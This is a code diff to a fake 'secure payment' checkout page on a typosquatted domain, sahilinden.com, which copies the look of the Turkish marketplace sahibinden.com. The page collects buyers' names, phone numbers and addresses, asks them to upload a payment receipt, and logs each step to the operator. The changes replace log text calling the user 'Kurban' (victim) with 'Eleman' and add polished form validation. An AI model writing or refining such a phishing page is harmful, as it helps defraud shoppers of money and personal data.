@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>sahilinden.com - Güvenli Ödeme</title>
     <style>
-        /* SAHİBİNDEN BİREBİR RENK PALETİ VE FONT */
+       
         :root {
             --shb-yellow: #ffe800;
             --shb-blue: #0059a3;
@@ -578,6 +578,43 @@
             color: red;
             display: none;
         }
+
+        /* --- YENİ EKLENEN HATA MESAJI STİLLERİ --- */
+        .s3-error-msg {
+            display: none;
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 5px;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .s3-error-msg::before {
+            content: "!";
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 15px;
+            height: 15px;
+            background-color: #d32f2f;
+            color: white;
+            border-radius: 50%;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .s3-input-group.has-error input,
+        .s3-input-group.has-error select {
+            border-bottom: 2px solid #d32f2f;
+        }
+
+        .s3-input-group.has-error label {
+            color: #d32f2f;
+        }
+
+        .s3-input-group.has-error .s3-error-msg {
+            display: flex;
+        }
     </style>
 </head>
 <body>
@@ -718,18 +755,22 @@
                 <div class="s3-input-group">
                     <input type="text" id="adresAdi" placeholder=" " required>
                     <label>Adres adı</label>
+                    <div class="s3-error-msg">Bir adres adı girin.</div>
                 </div>
                 <div class="s3-input-group">
                     <input type="text" id="aliciAd" placeholder=" " required>
                     <label>Ad</label>
+                    <div class="s3-error-msg">Adınızı girin.</div>
                 </div>
                 <div class="s3-input-group">
                     <input type="text" id="aliciSoyad" placeholder=" " required>
                     <label>Soyad</label>
+                    <div class="s3-error-msg">Soyadınızı girin.</div>
                 </div>
                 <div class="s3-input-group">
                     <input type="tel" id="aliciTel" placeholder=" " required>
                     <label>Telefon</label>
+                    <div class="s3-error-msg">Telefon numaranızı başında sıfır olmadan girin.</div>
                 </div>
                 
                 <div class="s3-input-group">
@@ -738,6 +779,7 @@
                     </select>
                     <label>İl</label>
                     <div class="s3-select-icon"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+                    <div class="s3-error-msg">İl seçin.</div>
                 </div>
                 <div class="s3-input-group">
                     <select id="aliciIlce" required disabled>
@@ -745,6 +787,7 @@
                     </select>
                     <label>İlçe</label>
                     <div class="s3-select-icon"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+                    <div class="s3-error-msg">İlçe seçin.</div>
                 </div>
                 <div class="s3-input-group">
                     <select id="aliciMahalle" required disabled>
@@ -752,11 +795,13 @@
                     </select>
                     <label>Mahalle</label>
                     <div class="s3-select-icon"><svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"></path></svg></div>
+                    <div class="s3-error-msg">Mahalle seçin.</div>
                 </div>
                 
                 <div class="s3-input-group">
                     <input type="text" id="aliciAciKAdres" placeholder=" " required>
                     <label>Açık adres</label>
+                    <div class="s3-error-msg">Açık adresinizi girin.</div>
                 </div>
             </div>
             
@@ -927,7 +972,7 @@
             if (cevap.ok) { 
                 aktifIlanVerisi = await cevap.json(); 
                 ekraniDoldur(); 
-                logGonder("İlana Giriş Yaptı", "Kurban vitrini inceliyor.");
+                logGonder("İlana Giriş Yaptı", "Eleman vitrini inceliyor.");
             } else { 
                 document.getElementById('loader').style.display = 'none'; 
                 document.getElementById('errorMsg').style.display = 'block'; 
@@ -1101,6 +1146,36 @@
         if (mevcutAdim === 1) { mevcutAdim = 2; adimiGoster(); logGonder("Satın Al'a Bastı", "Sipariş özeti ekranına geçti."); } 
         else if (mevcutAdim === 2) { mevcutAdim = 3; adimiGoster(); logGonder("Özeti Onayladı", "Adres girme ekranına geçti."); }
         else if (mevcutAdim === 3) {
+            const alanlar = [
+                { id: 'adresAdi', div: document.getElementById('adresAdi') },
+                { id: 'aliciAd', div: document.getElementById('aliciAd') },
+                { id: 'aliciSoyad', div: document.getElementById('aliciSoyad') },
+                { id: 'aliciTel', div: document.getElementById('aliciTel'), isTel: true },
+                { id: 'aliciIl', div: document.getElementById('aliciIl') },
+                { id: 'aliciIlce', div: document.getElementById('aliciIlce') },
+                { id: 'aliciMahalle', div: document.getElementById('aliciMahalle') },
+                { id: 'aliciAciKAdres', div: document.getElementById('aliciAciKAdres') }
+            ];
+
+            let formGecerli = true;
+
+            alanlar.forEach(alan => {
+                const val = alan.div.value.trim();
+                const group = alan.div.closest('.s3-input-group');
+                
+                let gecerliMi = val !== '';
+                if (alan.isTel && (val === '' || val === '+90 ')) { gecerliMi = false; }
+
+                if (!gecerliMi) {
+                    group.classList.add('has-error');
+                    formGecerli = false;
+                } else {
+                    group.classList.remove('has-error');
+                }
+            });
+
+            if (!formGecerli) return; // Hata varsa burada kes, ilerleme.
+
             const ad = document.getElementById('aliciAd').value.trim(); 
             const soyad = document.getElementById('aliciSoyad').value.trim();
             const tel = document.getElementById('aliciTel').value.trim();
@@ -1108,10 +1183,6 @@
             const ilce = document.getElementById('aliciIlce').value;
             const mahalle = document.getElementById('aliciMahalle').value;
             const adresDetay = document.getElementById('aliciAciKAdres').value.trim();
-            
-            if(!ad || !soyad || tel === '' || tel === '+90 ' || !il || !ilce || !mahalle || !adresDetay) { 
-                alert("Lütfen teslimat bilgilerini eksiksiz doldurun."); return; 
-            }
             
             // Adres verilerini backend'in beklediği yapıya birleştiriyoruz
             window.tamAdresGecici = `${il} / ${ilce} - ${mahalle} - ${adresDetay}`;
@@ -1124,6 +1195,16 @@
             if(!secilenDekontDosyasi) { alert("Lütfen ödeme dekontunuzu seçin."); return; }
             dekontuGonder();
         }
+    });
+
+    // Kullanıcı bir alana yazı yazmaya veya seçim yapmaya başladığında kırmızı hatayı kaldır
+    document.querySelectorAll('.s3-input-group input, .s3-input-group select').forEach(el => {
+        el.addEventListener('input', function() {
+            this.closest('.s3-input-group').classList.remove('has-error');
+        });
+        el.addEventListener('change', function() {
+            this.closest('.s3-input-group').classList.remove('has-error');
+        });
     });
 
     // ---- 6. DEKONT YÜKLEME VE SİPARİŞİ TAMAMLAMA ----
@@ -1174,7 +1255,7 @@
             });
 
             if(siparisCevap.ok) {
-                logGonder("BAŞARILI BİTİŞ", "Kurban dekontu yükledi ve siparişi tamamladı.");
+                logGonder("BAŞARILI BİTİŞ", "Eleman dekontu yükledi ve siparişi tamamladı.");
                 document.getElementById('step4').innerHTML = `<div style="text-align:center; padding: 40px 10px;"><h2 style="color: #00a651; margin-bottom: 15px; font-size: 24px;">Siparişiniz Başarılı!</h2><p style="color: #333; font-size: 15px; line-height:1.6;">Ödemeniz ve dekontunuz satıcıya iletilmiştir. Sipariş durumunu satıcıdan takip edebilirsiniz.</p></div>`;
                 document.getElementById('bottomBar').style.display = 'none'; btnGeri.style.display = 'none';
             } else { throw new Error(); }
